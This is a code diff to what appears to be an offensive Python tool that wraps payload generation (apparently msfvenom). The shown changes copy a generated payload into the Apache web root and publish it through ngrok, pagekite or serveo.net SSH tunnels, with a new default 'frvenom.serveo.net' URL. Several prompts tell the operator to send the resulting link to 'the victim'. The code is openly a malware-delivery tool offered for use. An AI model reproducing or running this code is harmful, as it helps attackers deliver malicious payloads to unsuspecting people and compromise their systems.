@@ -98,7 +98,8 @@ def venom():
     server=input("DO YOU WANT TO SEND YOUR PAYLOAD VIA A LINK? [Y/n] : ")
     if server=="Y" or server=="y":
       print("[1]generate link through ngrok")
-      print("[2]generate link through pagekite( the best method)")
+      print("[2]generate link through pagekite")
+      print("[3]GENERATE CUSTOM LINK URL VIA SERVEO.NET(the best ever method)")
       link=int(input("ENTER YOUR CHOICE : "))
       if link==1:
             os.system(f"cp {output}/{name} /var/www/html")
@@ -117,15 +118,21 @@ def venom():
                   os.system("./ngrok http 80")
             
             else:
-                  print("YOUR SYSTEM IS NOT CONFIGURED NGROK PROPERLY...")
-                  print("PLEASE LOGIN YOUR NGROK ACCOUNT AND COPY THE AUTHTOKEN ALONE :")
-                  input("ENTER TO CONTINUE , LOGIN :")
-                  webbrowser.open("https://dashboard.ngrok.com/login")
-                  auth2=input("ENTER THE AUTHTOKEN STRING ALONE : ")
-                  os.system(f"./ngrok authtoken {auth2}")
-                  input(f"send the ngrok link/{name} and send to the victim..!!('enter to continue!)")
-                  input(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}(enter to continue)")
-                  os.system("./ngrok http 80")
+               print("NICE , you have an account in ngrok...")
+               if os.path.isfile("/root/.ngrok2/ngrok.yml"):
+                   print(f"send the ngrok link/{name} and send to the victim..!!")
+                   print(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}")
+                   os.system("./ngrok http 80")               
+               else:
+                   print("YOUR SYSTEM IS NOT CONFIGURED NGROK PROPERLY...")
+                   print("PLEASE LOGIN YOUR NGROK ACCOUNT AND COPY THE AUTHTOKEN ALONE :")
+                   input("ENTER TO CONTINUE , LOGIN :")
+                   webbrowser.open("https://dashboard.ngrok.com/login")
+                   auth2=input("ENTER THE AUTHTOKEN STRING ALONE : ")
+                   os.system(f"./ngrok authtoken {auth2}")
+                   input(f"send the ngrok link/{name} and send to the victim..!!('enter to continue!)")
+                   input(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}(enter to continue)")
+                   os.system("./ngrok http 80")
                          
       elif link==2:
            os.system(f"cp {output}/{name} /var/www/html")
@@ -142,39 +149,33 @@ def venom():
            print(" ")
            os.system("service apache2 start")
            os.system(f"pagekite {pkname}.pagekite.me")
-      else:
-           print("NO INPUT ENTERED BY USER,,,,,,USING DEFAULT using NGROK....")
-           os.system(f"cp {output}/{name} /var/www/html")
-           print("SERVER STARTED......")
-           print(f" COPY THE LINK BELOW AND ADD ' /{name}  AND SEND THE LINK URL TO YOUR VICTIM")
-           print(f" <link>/{name}  ")
-           print(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}")
-           ack=input("do you understand?? : ")
-           os.system("service apache2 start")
-           ngrok=input("DO YOU HAVE AN ACCOUNT IN NGROK? [Y/n]....: ")
-           if ngrok=="n" or ngrok=="N":
-                 print(" ##### PLEASE ENTER THE AUTHTOKEN OF YOUR ACCOUNT#####")
-                 webbrowser.open("https://dashboard.ngrok.com/signup")
-                 auth=input(" ENTER THE AUTHTOKEN STRING ALONE(without './ngrok authtoken' phrase : ")
-                 os.system(f"./ngrok authtoken {auth}")
-                 os.system("./ngrok http 80")
+            
+            
+      elif link==3:
+           print("[1] DEFAULT URL (https://frvenom.serveo.net)")
+           print("[2] MAKE YOUR OWN CUSTOM DOMAIN NAME(eg:https://yourname.serveo.net)")
+           serveo=int(input("Enter the choice: "))
+           if serveo==1:
+              print("SEND THE BELOW URL TO THE VICTIM....>>")
+              print(f"https://frvenom.serveo.net/{name}")
+              print("SERVER STARTED.......")
+              os.system("ssh -R frvenom.serveo.net:80:localhost:80 serveo.net")
+           elif serveo==2:
+                domain=input("ENTER ANY NAME OF YOUR CHOICE : ")
+                print(f"send this URL to the victim >>>> https://{domain}.serveo.net/{name}  ")
+                print("SERVER STARTED.......")
+                os.system(f"ssh -R {domain}.serveo.net:80:localhost:80 serveo.net")
            else:
-               print("NICE , you have an account in ngrok...")
-               if os.path.isfile("/root/.ngrok2/ngrok.yml"):
-                   print(f"send the ngrok link/{name} and send to the victim..!!")
-                   print(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}")
-                   os.system("./ngrok http 80")
-               else:
-                   print("YOUR SYSTEM IS NOT CONFIGURED NGROK PROPERLY...")
-                   print("PLEASE LOGIN YOUR NGROK ACCOUNT AND COPY THE AUTHTOKEN ALONE :")
-                   input("ENTER TO CONTINUE , LOGIN :")
-                   webbrowser.open("https://dashboard.ngrok.com/login")
-                   auth2=input("ENTER THE AUTHTOKEN STRING ALONE : ")
-                   os.system(f"./ngrok authtoken {auth2}")
-                   input(f"send the ngrok link/{name} and send to the victim..!!('enter to continue!)")
-                   input(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}(enter to continue)")
-                   os.system("./ngrok http 80")
-                         
+               print("USING DEFAULT URL...")
+               print(f"SEND THIS URL TO THE VICTIM >>>>> https://frvenom.serveo.net/{name}")
+               os.system("ssh -R frvenom.serveo.net:80:localhost:80 serveo.net")
+      else:
+           print("NO INPUT ENTERED BY USER,,,,,,USING DEFAULT URL....")
+           print("SEND THE BELOW URL TO THE VICTIM....>>")
+           print(f"https://frvenom.serveo.net/{name}")
+           print("SERVER STARTED.......")
+           os.system("ssh -R frvenom.serveo.net:80:localhost:80 serveo.net")
+           
     elif server=="n" or server=="N":
         exiting=input("ANY KEY TO EXIT....")
         print("##########  HAPPY HACKING ###########")
